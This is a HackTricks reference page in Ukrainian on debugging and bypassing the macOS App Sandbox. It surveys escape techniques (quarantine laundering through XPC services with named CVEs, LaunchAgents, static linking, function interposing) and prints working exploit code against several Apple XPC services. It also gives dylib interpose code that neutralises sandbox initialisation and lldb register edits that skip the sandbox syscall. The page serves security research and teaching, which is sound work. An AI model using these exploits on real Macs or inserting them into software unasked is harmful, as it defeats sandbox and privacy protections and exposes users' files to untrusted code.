# Debug і Bypass macOS Sandbox

{{#include ../../../../../banners/hacktricks-training.md}}

## Процес завантаження Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Зображення з <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

На попередньому зображенні можна побачити **як завантажується sandbox**, коли запускається застосунок із entitlement **`com.apple.security.app-sandbox`**.

Компілятор пов'яже `/usr/lib/libSystem.B.dylib` із бінарним файлом.

Потім **`libSystem.B`** викликає кілька функцій, доки **`xpc_pipe_routine`** не надсилає entitlements застосунку до **`securityd`**. Securityd перевіряє, чи потрібно помістити процес у sandbox, і, якщо так, поміщає його туди.\
Нарешті sandbox активується викликом **`__sandbox_ms`**, який викликає **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Можливі Bypasses

### Обхід quarantine attribute

До **файлів, створених sandboxed-процесами**, додається **quarantine attribute**, щоб запобігти втечі із sandbox: якщо ви створите новий застосунок і спробуєте його запустити, quarantine flag заблокує його. Отже, **якщо ви можете створити файл або папку *без* quarantine attribute, ви можете втекти з App Sandbox** — просто створіть `.app` bundle і запустіть його за допомогою `open`, оскільки щойно запущений процес працюватиме під керуванням LaunchServices, а не у вашому sandbox.

Надійний спосіб створити **unquarantined drop** — попросити **інший процес створити файл замість вас**. Як описано в [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) Mickey Jin, **App Sandbox** позначає створені файли quarantine, але **XPC services, що працюють під Service Sandbox, цього не роблять**. Тому кілька неавтентифікованих XPC services можна було використовувати як примітив "quarantine laundering":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) і **CVE-2023-32414** (`ArchiveService`): розпаковують archive, переданий sandboxed-застосунком, у вибране місце **без передавання quarantine xattr** розпакованому вмісту.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): path traversal у `submitSignpostDataWithConfig:` дозволяв створювати **довільні директорії без quarantine**, чого достатньо для побудови всієї структури `.app` bundle за межами container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): підключає quarantined DMG **без встановлення quarantine для отриманого пристрою**, тому застосунки на змонтованому томі можна запускати.

> [!TIP]
> Під час розпакування зазвичай **втрачається біт дозволу на виконання**. Workaround, використаний у CVE-2023-27944, полягав у розміщенні **symlink** на наявний підписаний системний бінарний файл (наприклад, `/System/Library/CoreServices/Automator Application Stub`) як основного executable bundle, що зберігає можливість його запуску без необхідності мати `+x` для створеного файлу.

> [!CAUTION]
> Це працює тому, що перевірка керується **flag елемента, який запускається**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, і лише після цього *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Відсутність flag на bundle, який ви запускаєте, означає відсутність перевірки Gatekeeper — саме цей примітив надають наведені вище CVE.<sup>[[5]](#references)</sup>
>
> Зверніть увагу: якщо `.app` bundle уже отримав дозвіл на запуск (має quarantine xattr із flag "authorized to run"), його також можна було б використати... за винятком того, що тепер ви не можете записувати всередину **`.app`** bundles, якщо не маєте певних привілейованих TCC perms (яких у вас не буде всередині sandbox).

### Зловживання функціональністю Open

У [**last examples of Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) можна побачити, як функціональністю cli **`open`** можна зловживати для обходу sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Навіть якщо застосунок **призначений для роботи в sandbox** (`com.apple.security.app-sandbox`), обхід sandbox можливий, якщо його, наприклад, **запущено з LaunchAgent** (`~/Library/LaunchAgents`).\
Як пояснюється в [**this post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), якщо ви хочете забезпечити persistence за допомогою sandboxed-застосунку, можна налаштувати його автоматичний запуск як LaunchAgent і, можливо, інжектити malicious code через змінні середовища DyLib.<sup>[[6]](#references)</sup>

### Зловживання Auto Start Locations

Якщо sandboxed-процес може **записувати** в місце, де **пізніше unsandboxed-застосунок запустить бінарний файл**, він зможе **втекти, просто розмістивши** там цей бінарний файл. Хорошими прикладами таких місць є `~/Library/LaunchAgents` або `/System/Library/LaunchDaemons`.

Для цього вам може знадобитися навіть **2 кроки**: змусити процес із **більш permissive sandbox** (`file-read*`, `file-write*`) виконати ваш code, який фактично запише файл у місце, де його буде **виконано unsandboxed**.

Перегляньте цю сторінку про **Auto Start locations**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Зловживання іншими процесами

Якщо з sandboxed-процесу ви можете **скомпрометувати інші процеси**, що працюють у менш обмежувальних sandbox (або взагалі без них), ви зможете втекти до їхніх sandbox:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Доступні System і User Mach services

Sandbox також дозволяє взаємодіяти з певними **Mach services** через XPC, визначені у profile `application.sb`. Якщо ви можете **зловживати** одним із цих services, то, можливо, зможете **втекти із sandbox**.

Як зазначено в [this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), інформація про Mach services зберігається в `/System/Library/xpc/launchd.plist`. Усі System і User Mach services можна знайти, виконавши пошук у цьому файлі за `<string>System</string>` і `<string>User</string>`.<sup>[[4]](#references)</sup>

Крім того, можна перевірити, чи доступний Mach service для sandboxed-застосунку, викликавши `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Доступні Mach-сервіси PID

Ці Mach-сервіси вперше використали для [виходу з sandbox у цьому writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). На той час **усі XPC-сервіси, необхідні** застосунку та його framework, були видимі в PID domain застосунку (це Mach Services із `ServiceType` зі значенням `Application`).<sup>[[4]](#references)</sup>

Щоб **зв’язатися з XPC-сервісом PID Domain**, достатньо зареєструвати його в застосунку за допомогою рядка на кшталт:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Крім того, усі Mach-сервіси **Application** можна знайти, виконавши пошук `<string>Application</string>` у `System/Library/xpc/launchd.plist`.

Ще один спосіб знайти дійсні xpc-сервіси — перевірити сервіси в:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Кілька прикладів зловживання цією технікою можна знайти в [**оригінальному описі**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), однак нижче наведено кілька узагальнених прикладів.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Цей сервіс дозволяє кожне XPC-з'єднання, завжди повертаючи `YES`, а метод `runTask:arguments:withReply:` виконує довільну команду з довільними параметрами.

Експлойт був «настільки простим»:
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Цей XPC service дозволяв доступ усім клієнтам, завжди повертаючи `YES`, а метод `createZipAtPath:hourThreshold:withReply:` приймав шлях до папки та стискав її у ZIP-файл.

Таким чином, можна створити підроблену структуру папок app, стиснути її, а потім розпакувати та виконати, щоб вийти із sandbox, оскільки нові файли не матимуть quarantine attribute.

Exploit полягав у наступному:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Цей XPC service дозволяє надати read і write access до довільного URL XPC client через метод `extendAccessToURL:completion:`, який приймав будь-яке з'єднання. Оскільки XPC service має FDA, ці дозволи можна використати для повного обходу TCC.

exploit полягав у:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Статична компіляція та динамічне linking

[**Це дослідження**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) виявило 2 способи обійти Sandbox. Оскільки Sandbox застосовується з userland під час завантаження бібліотеки **libSystem**, якщо бінарний файл міг уникнути її завантаження, він ніколи не потрапив би під дію Sandbox:<sup>[[2]](#references)</sup>

- Якщо бінарний файл було **повністю статично скомпільовано**, він міг уникнути завантаження цієї бібліотеки.
- Якщо **бінарному файлу не потрібно було б завантажувати жодні бібліотеки** (оскільки linker також знаходиться в libSystem), йому не потрібно було б завантажувати libSystem.

### Shellcodes

Зверніть увагу, що **навіть shellcodes** в ARM64 потрібно лінкувати з `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Неуспадковані обмеження

Як пояснюється у **[додатку до цього writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, обмеження sandbox, як-от:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
можна обійти новим процесом, який, наприклад, виконує:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Однак, звісно, цей новий процес не успадкує entitlements або привілеї від батьківського процесу.

### Entitlements

Зверніть увагу, що навіть якщо деякі **дії** можуть бути **дозволені sandbox**, якщо застосунок має певний **entitlement**, як у:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Для отримання додаткової інформації про **Interposting** перевірте:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer`, щоб запобігти sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Перехоплення `__mac_syscall` для запобігання Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Налагодження та обхід Sandbox за допомогою lldb

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Потім скомпілюйте застосунок:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Додаток спробує **прочитати** файл **`~/Desktop/del.txt`**, що **Sandbox не дозволить**.\
> Створіть там файл, оскільки після обходу Sandbox додаток зможе його прочитати:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Давайте налагодимо додаток, щоб побачити, коли завантажується Sandbox:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Навіть після обходу Sandbox TCC** запитає користувача, чи хоче він дозволити процесу читати файли з робочого столу

## References

- [1] [Jonathan Levin - Apple Sandbox: Deeper into the Quagmire (слайди HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Обхід Sandbox Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: Deeper into the Quagmire (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Нова ера обходів macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Пояснення: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): обхід macOS TCC за допомогою Telegram із використанням DyLib Injection (частина 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
